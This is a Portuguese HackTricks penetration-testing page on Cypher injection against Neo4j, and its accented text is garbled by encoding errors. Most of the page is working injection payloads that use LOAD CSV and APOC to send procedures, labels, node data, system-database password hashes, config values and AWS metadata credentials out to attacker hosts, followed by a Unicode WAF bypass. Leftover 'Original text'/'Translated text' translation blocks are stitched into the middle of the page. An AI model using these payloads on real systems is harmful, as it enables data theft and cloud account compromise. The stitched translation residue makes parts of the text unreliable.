# Inje√ß√£o de Cypher (neo4j)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Inje√ß√µes de Cypher Comuns

As declara√ß√µes **MATCH** e **WHERE** s√£o **cen√°rios comuns**.

Quando encontramos uma inje√ß√£o, a maneira de explor√°-la depende da **localiza√ß√£o dentro da consulta**. Abaixo est√° uma tabela de diferentes locais de inje√ß√£o e exemplos de explora√ß√£o:

| Consulta injet√°vel                                                                                                   | Inje√ß√£o                                              |
| ------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| `MATCH (o) WHERE o.Id='{input}'`                                                                                    | `' OR 1=1 WITH 0 as _l00 {‚Ä¶} RETURN 1 //`            |
| <p><code>MATCH (o) WHERE '{input}' = o.Id</code><br><code>MATCH (o) WHERE {input} in [diferentes, valores]</code></p> | `'=' {‚Ä¶} WITH 0 as _l00 RETURN 1 //`                 |
| `MATCH (o) WHERE o:{input}`                                                                                         | `a {‚Ä¶} WITH 0 as _l00 RETURN 1 //`                   |
| `` MATCH (o) WHERE o:`{input}` ``                                                                                   | ``a` {...} WITH 0 as _l00 RETURN 1 //``              |
| `MATCH (o {id:'{input}'})`                                                                                          | `'}) RETURN 1 UNION MATCH (n) {...} RETURN 1 //`     |
| `MATCH (o:{input})`                                                                                                 | `a) RETURN 1 UNION MATCH (n){...} RETURN 1//`        |
| ``MATCH (o:`{input}`)``                                                                                             | ``a`) RETURN 1 UNION MATCH (n){...} RETURN 1 //``    |
| `MATCH (o)-[r {id:'{input}'})]-(o2)`                                                                                | `'}]-() RETURN 1 UNION MATCH (n){...} RETURN 1//`    |
| `MATCH (o)-[r:{input}]-(o2)`                                                                                        | `a]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //`    |
| ``MATCH (o)-[r:`{input}`]-(o2)``                                                                                    | ``a`]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //`` |

Observe a declara√ß√£o UNION:

1. A raz√£o pela qual UNION √© necess√°ria √© que, se a declara√ß√£o MATCH n√£o retornar nada, o restante da consulta n√£o ser√° executado. Portanto, todas as coisas nefastas que podemos fazer l√° simplesmente n√£o ser√£o executadas.
2. Adicionamos "RETURN 1" antes da UNION para que ambas as partes retornem as mesmas colunas, o que √© necess√°rio para a consulta ser executada.

Ent√£o, qual √© a declara√ß√£o "WITH"?

Usando WITH, podemos descartar todas as vari√°veis existentes. Isso √© importante quando n√£o sabemos qual √© a consulta (mais sobre isso depois). Se nossa carga √∫til tentar definir uma vari√°vel que j√° existe, a consulta falhar√° ao ser executada.

Naturalmente, se conhecemos a consulta e o banco de dados, nenhuma dessas t√©cnicas √© necess√°ria. Podemos at√© manipular os dados retornados para, por sua vez, manipular o processo em vez de apenas abusar do servidor.

## Exfiltra√ß√£o HTTP

√â poss√≠vel usar o seguinte m√©todo para exfiltrar informa√ß√µes para o dom√≠nio controlado pelo atacante:
```sql
LOAD CSV FROM 'https://attacker.com/'
```
Original text:

```
## Cypher Injection (Neo4j)

Cypher is a query language used by Neo4j, a popular graph database. Cypher injection is similar to SQL injection, but instead of injecting SQL code, we inject Cypher code.

### Basic Injection

The most basic injection is to inject a `MATCH` clause that returns all nodes in the database:

```
MATCH (n) RETURN n
```

### Retrieving Sensitive Information

To retrieve sensitive information, we can inject a `MATCH` clause that returns the desired nodes and their properties:

```
MATCH (n:User) RETURN n.username, n.password
```

### Modifying the Database

We can also modify the database by injecting a `CREATE` or `MERGE` clause:

```
CREATE (n:Malware {name: 'WannaCry'})
```

### Preventing Injection

To prevent Cypher injection, we can use parameterized queries. Here's an example:

```
String query = "MATCH (n:User {username: $username, password: $password}) RETURN n";
Map<String, Object> parameters = new HashMap<>();
parameters.put("username", username);
parameters.put("password", password);
Result result = session.run(query, parameters);
```

In this example, the `$username` and `$password` variables are replaced with the actual values when the query is executed, preventing injection.
```

Translated text:

```
## Inje√ß√£o de Cypher (Neo4j)

Cypher √© uma linguagem de consulta usada pelo Neo4j, um popular banco de dados de gr√°ficos. A inje√ß√£o de Cypher √© semelhante √† inje√ß√£o de SQL, mas em vez de injetar c√≥digo SQL, injetamos c√≥digo Cypher.

### Inje√ß√£o B√°sica

A inje√ß√£o mais b√°sica √© injetar uma cl√°usula `MATCH` que retorna todos os n√≥s no banco de dados:

```
MATCH (n) RETURN n
```

### Recuperando informa√ß√µes sens√≠veis

Para recuperar informa√ß√µes sens√≠veis, podemos injetar uma cl√°usula `MATCH` que retorna os n√≥s desejados e suas propriedades:

```
MATCH (n:User) RETURN n.username, n.password
```

### Modificando o banco de dados

Tamb√©m podemos modificar o banco de dados injetando uma cl√°usula `CREATE` ou `MERGE`:

```
CREATE (n:Malware {name: 'WannaCry'})
```

### Prevenindo Inje√ß√£o

Para prevenir a inje√ß√£o de Cypher, podemos usar consultas parametrizadas. Aqui est√° um exemplo:

```
String query = "MATCH (n:User {username: $username, password: $password}) RETURN n";
Map<String, Object> parameters = new HashMap<>();
parameters.put("username", username);
parameters.put("password", password);
Result result = session.run(query, parameters);
```

Neste exemplo, as vari√°veis `$username` e `$password` s√£o substitu√≠das pelos valores reais quando a consulta √© executada, prevenindo a inje√ß√£o.
```sql
// Injection in:
MATCH (o) WHEREo.Id='{input}' RETURN o

// Injection to get all the preocedures
' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 

```
## APOC

A primeira coisa que um invasor deve verificar √© **se o APOC est√° instalado**. O APOC (procedimentos incr√≠veis no Cypher) √© um **plugin extremamente popular**, oficialmente suportado pelo Neo4j, que melhora muito suas capacidades. O APOC adiciona muitas **fun√ß√µes e procedimentos adicionais** que os desenvolvedores podem usar em seu ambiente. Os invasores podem usar os v√°rios procedimentos e fun√ß√µes que o APOC oferece para realizar ataques mais avan√ßados.

### Procedimentos para processar dados e enviar solicita√ß√µes HTTP

* `apoc.convert.toJson` ‚Äî converte n√≥s, mapas e mais em JSON
* `apoc.text.base64Encode` ‚Äî obt√©m uma string e a codifica como base64

√â poss√≠vel **definir cabe√ßalhos** e **enviar outros m√©todos** al√©m do GET. Exemplos: 

{% code overflow="wrap" %}
```sql
CALL apoc.load.jsonParams("http://victim.internal/api/user",{ method: "POST", `Authorization`:"BEARER " + hacked_token},'{"name":"attacker", "password":"rockyou1"}',"") yield value as value 

CALL apoc.load.csvParams("http://victim.internal/api/me",{ `Authorization`:"BEARER " + hacked_token}, null,{header:FALSE}) yield list 
```
### Procedimentos para avaliar consultas

* `apoc.cypher.runFirstColumnMany` - uma fun√ß√£o que retorna os valores da primeira coluna como uma lista
* `apoc.cypher.runFirstColumnSingle` - uma fun√ß√£o que retorna o primeiro valor da primeira coluna
* `apoc.cypher.run` - um procedimento que executa uma consulta e retorna os resultados como um mapa
* `apoc.cypher.runMany` - um procedimento que executa uma consulta ou v√°rias consultas separadas por ponto e v√≠rgula e retorna os resultados como um mapa. As consultas s√£o executadas em uma transa√ß√£o diferente.

## Extraindo informa√ß√µes

### Vers√£o do servidor

Uma maneira de obter a vers√£o do servidor √© usar o procedimento `dbms.components()`
```sql
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```
### Obter consulta em execu√ß√£o

A maneira mais f√°cil √© usar o procedimento `dmbs.listQueries()`.
```sql
' OR 1=1 call dbms.listQueries() yield query LOAD CSV FROM 'http://10.0.2.4:8000/?' + query as l RETURN 1 // 
```
{% endcode %}

No **Neo4j 5 `dbms.listQueries` foi removido**. Em vez disso, podemos usar "SHOW TRANSACTIONS". Existem duas limita√ß√µes principais: **as consultas SHOW n√£o s√£o injet√°veis**, e ao contr√°rio de `listQueries`, podemos **ver apenas a consulta atualmente executada** na transa√ß√£o e n√£o todas elas.

Se o **APOC** core estiver **instalado**, podemos us√°-lo para executar SHOW TRANSACTIONS. Se executarmos na mesma transa√ß√£o, apenas SHOW TRANSACTIONS ser√° retornado em vez da consulta que estamos tentando ver. Podemos usar **`apoc.cypher.runMany`** para executar SHOW TRANSACTIONS, porque ao contr√°rio de outras fun√ß√µes e procedimentos apoc.cypher, ele √© executado em uma transa√ß√£o diferente.
```sql
' OR 1=1 call apoc.cypher.runMany("SHOW TRANSACTIONS yield currentQuery RETURN currentQuery",{}) yield result LOAD CSV FROM 'http://10.0.2.4:8000/?' + result['currentQuery'] as l RETURN 1//
```
### Obter r√≥tulos

Usando o m√©todo integrado **`db.labels`**, √© poss√≠vel listar todos os r√≥tulos existentes.

{% code overflow="wrap" %}
```sql
'}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://attacker_ip/?l='+label as l RETURN 0 as _0 
```
### Obter propriedades de uma chave

A fun√ß√£o integrada **`keys`** pode ser usada para **listar as chaves das propriedades** (Isso n√£o funcionar√° se um dos campos for uma lista ou um mapa).

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```
Se o APOC estiver dispon√≠vel, h√° uma maneira melhor de fazer isso usando `apoc.convert.toJson`
```sql
' OR 1=1 WITH 0 as _0 MATCH (n) LOAD CSV FROM 'http://10.0.2.4:8000/?' + apoc.convert.toJson(n) AS l RETURN 0 as _0 // 
```
### Obter fun√ß√µes e procedimentos

Usando os procedimentos internos **`dbms.functions()`** e **`dbms.procedures()`** √© poss√≠vel listar todas as fun√ß√µes e procedimentos.

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as _l00 CALL dbms.functions() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 //
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 
```
{% endcode %}

Esses procedimentos **foram removidos no Neo4j 5.** Em vez disso, podemos usar **`SHOW PROCEDURES`** e **`SHOW FUNCTIONS`.** Consultas SHOW n√£o podem ser injetadas.

Se o APOC core estiver instalado, podemos usar qualquer um dos procedimentos ou fun√ß√µes que executam consultas para listar fun√ß√µes e procedimentos.
```sql
' OR 1=1 WITH apoc.cypher.runFirstColumnMany("SHOW FUNCTIONS YIELD name RETURN name",{}) as names UNWIND names AS name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 
```

```sql
' OR 1=1 CALL apoc.cypher.run("SHOW PROCEDURES yield name RETURN name",{}) yield value 
LOAD CSV FROM 'https://attacker.com/' + value['name'] as _l RETURN 1 // 
```
### Obter banco de dados do sistema

O banco de dados do sistema √© um banco de dados Neo4j especial que normalmente n√£o pode ser consultado. Ele cont√©m dados interessantes armazenados como n√≥s:

* Bancos de dados
* Fun√ß√µes
* Usu√°rios (incluindo o hash da senha!)

Usando o APOC, √© poss√≠vel recuperar os n√≥s, incluindo os hashes. Apenas administradores podem fazer isso, mas na **edi√ß√£o gratuita do Neo4j, h√° apenas um usu√°rio administrador e nenhum outro usu√°rio**, ent√£o n√£o √© incomum se encontrar executando como administrador.

Use o procedimento **`apoc.systemdb.graph()`** para recuperar os dados.

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as a  call apoc.systemdb.graph() yield nodes LOAD CSV FROM 'http://10.0.2.4:8000/?nodes=' + apoc.convert.toJson(nodes) as l RETURN 1 //  
```
{% endcode %}

O Neo4j usa o SimpleHash do Apache Shiro para gerar o hash.

O resultado √© armazenado como uma string de valores separados por v√≠rgula:

* Algoritmo de hash
* Hash
* Salt
* Itera√ß√µes

**Por exemplo:**
```plaintext
SHA-256, 8a80d3ba24d91ef934ce87c6e018d4c17efc939d5950f92c19ea29d7e88b562c,a92f9b1c571bf00e0483effbf39c4a13d136040af4e256d5a978d265308f7270,1024 
```
### **Obter vari√°veis de ambiente**

Usando o APOC, √© poss√≠vel recuperar a vari√°vel de ambiente usando o procedimento **`apoc.config.map()`** ou **`apoc.config.list()`**.

Esses procedimentos s√≥ podem ser usados se estiverem inclu√≠dos na lista de procedimentos n√£o restritos no arquivo de configura√ß√£o (dbms.security.procedures.unrestricted). Isso √© mais comum do que se pensa, e pesquisar o nome da configura√ß√£o resulta em muitos sites e guias que aconselham a adicionar o valor "apoc.\*", o que permite todos os procedimentos APOC.
```sql
' OR 1=1 CALL apoc.config.list() YIELD key, value LOAD CSV FROM 'http://10.0.2.4:8000/?'+key+"="+" A B C" as l RETURN 1 // 
```
**Nota:** no Neo4j5, os procedimentos foram movidos para o APOC estendido.

### Endpoint de Metadados da Nuvem AWS

#### IMDSv1

{% code overflow="wrap" %}
```sql
LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/' AS roles UNWIND roles AS role LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role as l
  
WITH collect(l) AS _t LOAD CSV FROM 'http://{attacker_ip}/' + substring(_t[4][0],19, 20)+'_'+substring(_t[5][0],23, 40)+'_'+substring(_t[6][0],13, 1044) AS _ 
```
#### IMDSv2

Precisamos **especificar cabe√ßalhos** e precisamos **usar m√©todos diferentes de GET**.

**`LOAD CSV`** n√£o pode fazer nenhuma dessas coisas, mas podemos usar **`apoc.load.csvParams`** para obter o token e a fun√ß√£o, e depois **`apoc.load.jsonParams`** para obter as credenciais em si. A raz√£o pela qual usamos csvParams √© que a resposta n√£o √© um JSON v√°lido.

{% endcode %}
```sql
CALL apoc.load.csvParams("http://169.254.169.254/latest/api/token", {method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},"",{header:FALSE}) yield list WITH list[0] as token 

CALL apoc.load.csvParams("http://169.254.169.254/latest/meta-data/iam/security-credentials/", { `X-aws-ec2-metadata-token`:token},null,{header:FALSE}) yield list UNWIND list as role  

CALL apoc.load.jsonParams("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role,{ `X-aws-ec2-metadata-token`:token },null,"") yield value as value 
```
{% endcode %}

#### Contate diretamente a API da AWS

{% code overflow="wrap" %}
```sql
CALL apoc.load.csvParams('https://iam.amazonaws.com/?Action=ListUsers&Version=2010-05-08', {`X-Amz-Date`:$date, `Authorization`: $signed_token, `X-Amz-Security-Token`:$token}, null, ) YIELD list 
```
{% endcode %}

* $data √© formatado como %Y%m%dT%H%M%SZ
* $token √© o token que obtivemos do servidor de metadados
* $signed\_token √© calculado de acordo com https://docs.aws.amazon.com/general/latest/gr/signing\_aws\_api\_requests.html

## Bypass do WAF

### Inje√ß√£o de Unicode

No Neo4j >= v4.2.0, √© frequentemente poss√≠vel **injetar Unicode usando "\uXXXX"**. Por exemplo, voc√™ pode usar este m√©todo se o **servidor tentar remover caracteres** como: ', ", \` e assim por diante.

Isso pode n√£o funcionar se uma letra seguir a sequ√™ncia de escape Unicode. √â **seguro adicionar um espa√ßo** depois ou outra nota√ß√£o Unicode.

Por exemplo, se o servidor remover aspas simples, e a consulta parecer com a seguinte:
```sql
MATCH (a: {name: '$INPUT'}) RETURN a 
```
√â poss√≠vel injetar: 

{% code overflow="wrap" %}
```sql
\u0027 }) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM "http://attacker/ "+ label RETURN 0 as _o // 
```
{% endcode %}

## Refer√™ncias

* [https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits)
* [https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8](https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
